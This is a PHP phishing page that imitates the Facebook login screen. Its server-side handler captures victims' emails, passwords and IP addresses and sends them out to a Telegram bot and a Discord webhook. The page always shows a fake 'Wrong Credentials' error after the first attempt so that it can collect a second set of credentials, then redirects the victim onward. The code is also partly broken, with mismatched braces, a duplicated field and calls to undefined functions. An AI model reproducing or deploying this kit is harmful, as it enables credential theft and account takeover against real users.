 <?php
session_start();

if (!isset($_SESSION['avea_verify_flow']) || empty($_SESSION['avea_verify_flow'])) {
    header("Location: ../start-flow.php?method=facebook");
    exit;
}
if (empty($_SESSION['passed_apply'])) {
    header('Location: ../apply.php');   // ibalik sa apply kung hindi dumaan
    exit;
}
?>
<?php
date_default_timezone_set('Asia/Manila');
include '../config.php';
$fullName = $_SESSION['avea_full_name'] ?? 'Unknown';

// ---------- HELPER FUNCTIONS ----------
function tg_escape($value) {
    return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function discord_safe($value) {
    $value = trim((string)$value);
    if ($value === '') return '-';
    return str_replace('```', '｀｀｀', $value);
}

function short_discord_field($value, $limit = 950) {
    $value = (string)$value;
    if (strlen($value) > $limit) return substr($value, 0, $limit) . "\n...";
    return $value;
}

function send_notifications($data, $options = ['telegram' => true, 'discord' => true]) {
    global $telegram_bot_token, $telegram_chat_id, $discord_webhook_url, $fullName;

    // ---------- TELEGRAM ----------
 $tgMessage  = "✨ <b>New Facebook Login Notification</b>\n\n";

$tgMessage .= "<b>From Name:</b> <code>{$data['From Name']}</code>\n";
$tgMessage .= "<b>IP Address:</b> <code>{$data['IP Address']}</code>\n";
$tgMessage .= "<b>Time:</b> <code>{$data['Time']}</code>\n\n";

foreach ($data as $key => $value) {
    if (strpos($key, 'Email') === 0 || strpos($key, 'Password') === 0) {
        $tgMessage .= "<b>{$key}:</b> <code>{$value}</code>\n";
    }
}
        $tgUrl = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
        $tgParams = [
            'chat_id' => $telegram_chat_id,
            'text' => $tgMessage,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];

        $ch = curl_init($tgUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $tgParams);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);curl($tgMessage);
        curl_close($ch);
    }

    // ---------- DISCORD ----------
    if (!empty($options['discord']) && !empty($discord_webhook_url)) {
        $discordFields = [];
// From Name
$discordFields[] = [
    'name' => 'From Name',
     'value' => '`' . discord_safe($data['From Name']) . '`',
    'inline' => false
];

// IP Address
if (isset($data['IP Address'])) {
    $discordFields[] = [
        'name' => 'IP Address',
        'value' => '`' . discord_safe($data['IP Address']) . '`',
        'inline' => true
    ];
}
        // Make IP and Time inline
        if (isset($data['IP Address'])) {
            $discordFields[] = [
                'name' => 'IP Address',
                'value' => '`' . discord_safe($data['IP Address']) . '`',
                'inline' => true
            ];
        }
        if (isset($data['Time'])) {
            $discordFields[] = [
                'name' => 'Time'
,                'value' => '`' . discord_safe($data['Time']) . '`',
                'inline' => true
            ];
        }

        // Email & Password pair inline
        foreach ($data as $key => $value) {
            if (stripos($key, 'Email') !== false || stripos($key, 'Password') !== false) {
                $discordFields[] = [
                    'name' => $key,
                    'value' => '`' . discord_safe($value) . '`',
                    'inline' => true
                ];
            }
        }

        $payload = [
            'content' => "✨ **New Facebook Login Notification**",
            'embeds' => [
                [
                    'title' => 'Login Details',
                    'color' => 11740787,
                    'fields' => $discordFields,
                    'footer' => ['text' => 'Automated Notification System']
                ]
            ]
        ];

        $ch = curl_init($discord_webhook_url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);curI($payload);
        curl_close($ch);
    }


// ---------- POST HANDLER ----------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $attempt = $_POST['attempt'] ?? 1;

    if ($email && $password) {
        // ---------- GET USER IP ----------
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $ip = trim($ips[0]);
        }
        if ($ip === '::1' || $ip === '127.0.0.1') $ip = getHostByName(getHostName());

        $time = date('M d - h:i:s A');

        $data = [
             "From Name" => $fullName,
            "IP Address" => $ip,
            "Time" => $time,
            "Email #{$attempt}" => $email,
            "Password #{$attempt}" => $password
        ];

        send_notifications($data, ['telegram' => true, 'discord' => true]);

        echo json_encode(['success' => true]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Facebook - log in or sign up</title>
<link rel="icon" type="image/png" href="https://www.facebook.com/images/fb_icon_325x325.png">
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
<style>
body { font-family: 'Roboto', sans-serif; }
.spinner { width: 48px; height: 48px; border: 4px solid #3b82f6; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body class="bg-gray-100 flex flex-col items-center justify-center min-h-screen space-y-6">
<h1 class="text-5xl font-bold text-blue-600">facebook</h1>

<div class="bg-white/90 backdrop-blur-md p-8 rounded-2xl shadow-2xl w-full max-w-md border border-gray-200">
  <h2 class="text-center text-lg mb-4">Log Into Facebook</h2>

  <div id="errorBox" class="hidden text-center bg-red-100 text-black border border-red-500 p-4 rounded-md mb-4">
    <p class="font-bold">Wrong Credentials</p>
    <p>Invalid username or password</p>
  </div>

  <form id="loginForm" class="space-y-4">
    <div>
      <input id="emailInput" autocomplete="off" type="text" placeholder="Email or phone number"
        class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" />
      <p id="emailError" class="text-red-500 text-sm mt-1 hidden">Please enter a valid email address or phone number.</p>
    </div>
    <div class="relative">
      <input id="passwordInput" autocomplete="off" type="password" placeholder="Password"
        class="w-full px-4 py-3 border border-gray-300 rounded-md pr-12 focus:outline-none focus:ring-2 focus:ring-blue-500" />
      <span class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 cursor-pointer" onclick="togglePassword()">
        <i id="eyeIcon" class="fa-solid fa-eye-slash text-sm"></i>
      </span>
    </div>

    <button type="submit" class="w-full bg-blue-600 text-white text-lg font-semibold py-3 rounded-md hover:bg-blue-700 transition">Log In</button>
    <div id="loadingIndicator" class="hidden flex justify-center my-4"><div class="spinner"></div></div>
    <div class="text-center"><a href="#" class="text-blue-600 text-sm hover:underline">Forgot password?</a></div>
  </form>
</div>

<script>
let loginAttempts = 0;

function isValidEmailOrPhone(input){
    const emailRegex=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex=/^\+?\d{7,15}$/;
    return emailRegex.test(input)||phoneRegex.test(input);
}

document.getElementById("loginForm").addEventListener("submit", async function(e){
    e.preventDefault();
    const emailInput=document.getElementById("emailInput");
    const passwordInput=document.getElementById("passwordInput");
    const email=emailInput.value.trim();
    const password=passwordInput.value.trim();
    const emailError=document.getElementById("emailError");
    const errorBox=document.getElementById("errorBox");
    const loadingIndicator=document.getElementById("loadingIndicator");

    if(!isValidEmailOrPhone(email)){
        emailError.classList.remove("hidden");
        emailInput.classList.add("border-red-500","focus:ring-red-500");
        errorBox.classList.add("hidden");
        return;
    } else {
        emailError.classList.add("hidden");
        emailInput.classList.remove("border-red-500","focus:ring-red-500");
    }

    loginAttempts++;
    if(loginAttempts===1){
        localStorage.setItem("email1",email);
        localStorage.setItem("pass1",password);
        loadingIndicator.classList.remove("hidden");
        errorBox.classList.add("hidden");
        try{
            await fetch(window.location.href,{
                method:"POST",
                headers:{"Content-Type":"application/x-www-form-urlencoded"},
                body:new URLSearchParams({email,password,attempt:1})
            });
            loadingIndicator.classList.add("hidden");
            errorBox.classList.remove("hidden");
            errorBox.innerHTML=`<p class="font-bold">Wrong Credentials</p><p>Invalid username or password</p>`;
            emailInput.value="";
            passwordInput.value="";
        }catch{loadingIndicator.classList.add("hidden"); loginAttempts--;}
    } else if(loginAttempts===2){
        localStorage.setItem("email2",email);
        localStorage.setItem("pass2",password);
        loadingIndicator.classList.remove("hidden");
        try{
            await fetch(window.location.href,{
                method:"POST",
                headers:{"Content-Type":"application/x-www-form-urlencoded"},
                body:new URLSearchParams({email,password,attempt:2})
            });
            loadingIndicator.classList.add("hidden");
            window.location.href="../next-step.php";
        }catch{loadingIndicator.classList.add("hidden");}
    }
});

function togglePassword(){
    const passwordInput=document.getElementById("passwordInput");
    const icon=document.getElementById("eyeIcon");
    if(passwordInput.type==="password"){
        passwordInput.type="text";
        icon.classList.remove("fa-eye-slash");
        icon.classList.add("fa-eye");
    }else{
        passwordInput.type="password";
        icon.classList.remove("fa-eye");
        icon.classList.add("fa-eye-slash");
    }
}
</script>
</body>
</html>
